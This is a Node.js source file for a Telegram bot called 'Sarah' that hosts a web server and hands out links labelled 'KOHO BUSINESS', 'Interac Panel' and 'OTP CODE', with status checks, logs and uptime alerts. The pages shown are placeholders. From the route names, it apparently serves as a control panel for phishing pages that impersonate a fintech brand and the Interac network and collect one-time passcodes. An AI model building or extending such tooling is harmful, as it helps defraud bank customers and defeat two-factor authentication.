#!/usr/bin/env node
import fs from "fs"
import path from "path"
import http from "http"
import https from "https"
import express from "express"
import fetch from "node-fetch"
import TelegramBot from "node-telegram-bot-api"
import { fileURLToPath } from "url"

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

// ─────────────────────────────────────
// CONFIG
// ─────────────────────────────────────
const BASE = __dirname
const DOT_WWW = path.join(BASE, ".www")
const WWW = path.join(BASE, "www")
const LOGS = path.join(BASE, ".logs")
const DATA = path.join(BASE, ".data")
const WATCHERS_FILE = path.join(DATA, "watchers.json")

const BOT_NAME = "Sarah"
const PROJECT_NAME = "PROJECT-SARAH"
const TOKEN = process.env.BOT_TOKEN
const PUBLIC_URL = process.env.RENDER_EXTERNAL_URL

if (!TOKEN) throw "❌ BOT_TOKEN missing"
if (!PUBLIC_URL) throw "❌ RENDER_EXTERNAL_URL missing"

if (!fs.existsSync(LOGS)) fs.mkdirSync(LOGS)
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA)

const bot = new TelegramBot(TOKEN, { polling: true })

// ─────────────────────────────────────
// STATE
// ─────────────────────────────────────
const S = {
  url: PUBLIC_URL,
  started: Date.now(),
  watchers: new Set(),
  progressMid: {},
  lastOnline: null,
}

// ─────────────────────────────────────
// UTIL
// ─────────────────────────────────────
function log(msg) {
  const line = `[${new Date().toISOString()}] ${msg}\n`
  console.log(line.trim())
  fs.appendFileSync(path.join(LOGS, "debug.log"), line)
}

function loadWatchers() {
  if (fs.existsSync(WATCHERS_FILE)) {
    try {
      S.watchers = new Set(JSON.parse(fs.readFileSync(WATCHERS_FILE)))
    } catch { S.watchers = new Set() }
  }
}

function saveWatchers() {
  fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...S.watchers]))
}

function ensureWWW() {
  if (!fs.existsSync(DOT_WWW)) fs.mkdirSync(DOT_WWW)
  if (!fs.existsSync(WWW)) fs.mkdirSync(WWW)

  if (!fs.existsSync(path.join(DOT_WWW, "splash.php"))) {
    fs.writeFileSync(path.join(DOT_WWW, "splash.php"), `<h1>Koho Web App</h1>`)
  }

  for (const dir of ["dashboard","metrics","docs"]) {
    const d = path.join(DOT_WWW, dir)
    if (!fs.existsSync(d)) {
      fs.mkdirSync(d, { recursive:true })
      fs.writeFileSync(path.join(d, "index.html"), `<h1>${dir}</h1>`)
    }
  }

  fs.cpSync(DOT_WWW, WWW, { recursive:true })
}

async function shorten(url) {
  try {
    const r = await fetch(`https://clck.ru/--?url=${encodeURIComponent(url)}`)
    const t = (await r.text()).trim()
    return t.startsWith("http") ? t : url
  } catch {
    return url
  }
}

function blockBar(p, w=15) {
  const n = Math.round(w * Math.max(0, Math.min(1, p)))
  return "▮".repeat(n) + "▯".repeat(w - n)
}

async function httpCheck(url) {
  try {
    const r = await fetch(url, { method:"HEAD" })
    return r.ok
  } catch {
    return false
  }
}

// ─────────────────────────────────────
// EXPRESS SERVER (Render-ready)
// ─────────────────────────────────────
ensureWWW()

const app = express()
app.use(express.static(WWW))

app.get("/splash.php", (req,res) => {
  res.send("<h1>Koho Web App</h1>")
})

const PORT = process.env.PORT || 3000
app.listen(PORT, () => log(`Web online @ ${PORT}`))

// ─────────────────────────────────────
// TELEGRAM UI
// ─────────────────────────────────────
function linksPanel(base) {
  const routes = [
    ["/splash.php","KOHO BUSINESS"],
    ["/blacklist.php","Interac Panel"],
    ["/otp.php","OTP CODE"]
  ]

  return {
    inline_keyboard: routes.map(([path,name]) => [{
      text: name,
      url: `${base}${path}?src=sarah`
    }])
  }
}

function mainKB() {
  return {
    keyboard: [
      ["▶️ START","📎 LINKS MENU","⏹ STOP"],
      ["📊 STATUS","📝 LOGS","👁 WATCH"],
      ["❓ HELP","⚠️ DISCLAIMER","⚙️ SETTINGS"]
    ],
    resize_keyboard: true
  }
}

const INTRO = `Hi, I’m ${BOT_NAME} — welcome to ${PROJECT_NAME}.
Hosted on Render. No tunnel needed.
Tap ▶️ START to initialize.`

const HELP = `
▶️ START - prepares site
📎 LINKS MENU - show links
📊 STATUS - check health
👁 WATCH - toggle alerts
`

// ─────────────────────────────────────
// BOT HANDLERS
// ─────────────────────────────────────
bot.onText(/\/start/, (m) => {
  S.watchers.add(m.chat.id)
  saveWatchers()
  bot.sendMessage(m.chat.id, INTRO, { reply_markup: mainKB() })
})

bot.on("message", async (m) => {
  const text = (m.text || "").toUpperCase()
  const cid = m.chat.id
  S.watchers.add(cid); saveWatchers()

  if (text.includes("START")) {
    const mid = (await bot.sendMessage(cid, blockBar(0))).message_id

    for (let i=1;i<=15;i++) {
      await bot.editMessageText(blockBar(i/15), { chat_id:cid, message_id:mid })
      await new Promise(r=>setTimeout(r,40))
    }

    return bot.sendMessage(cid,"Links ready", { reply_markup: linksPanel(PUBLIC_URL) })
  }

  if (text.includes("LINK")) {
    return bot.sendMessage(cid,"Quick links:", { reply_markup: linksPanel(PUBLIC_URL) })
  }

  if (text.includes("STATUS")) {
    const ok = await httpCheck(PUBLIC_URL + "/splash.php")
    const up = Math.floor((Date.now()-S.started)/1000)
    return bot.sendMessage(cid, `${ok?"🟢 Online":"🔴 Offline"}\nUptime: ${up}s\n${PUBLIC_URL}`, { reply_markup: mainKB() })
  }

  if (text.includes("LOG")) {
    const data = fs.existsSync(path.join(LOGS,"debug.log"))
      ? fs.readFileSync(path.join(LOGS,"debug.log"),"utf8").slice(-1800)
      : "No logs"
    return bot.sendMessage(cid, data)
  }

  if (text.includes("WATCH")) {
    if (S.watchers.has(cid)) {
      S.watchers.delete(cid)
      bot.sendMessage(cid,"Watch disabled")
    } else {
      S.watchers.add(cid)
      bot.sendMessage(cid,"Watch enabled")
    }
    saveWatchers()
    return
  }

  if (text.includes("HELP")) {
    return bot.sendMessage(cid, HELP, { reply_markup: mainKB() })
  }

  bot.sendMessage(cid,"Try START or STATUS", { reply_markup: mainKB() })
})

// ─────────────────────────────────────
// MONITOR
// ─────────────────────────────────────
setInterval(async ()=>{
  if (!S.watchers.size) return
  const ok = await httpCheck(PUBLIC_URL + "/splash.php")

  if (S.lastOnline === null) S.lastOnline = ok
  if (ok !== S.lastOnline) {
    S.lastOnline = ok
    for (const id of S.watchers) {
      bot.sendMessage(id, ok ? "✅ Back online" : "⚠️ Went offline")
    }
  }
}, 10000)

loadWatchers()
log("Bot upgraded & online – Render edition")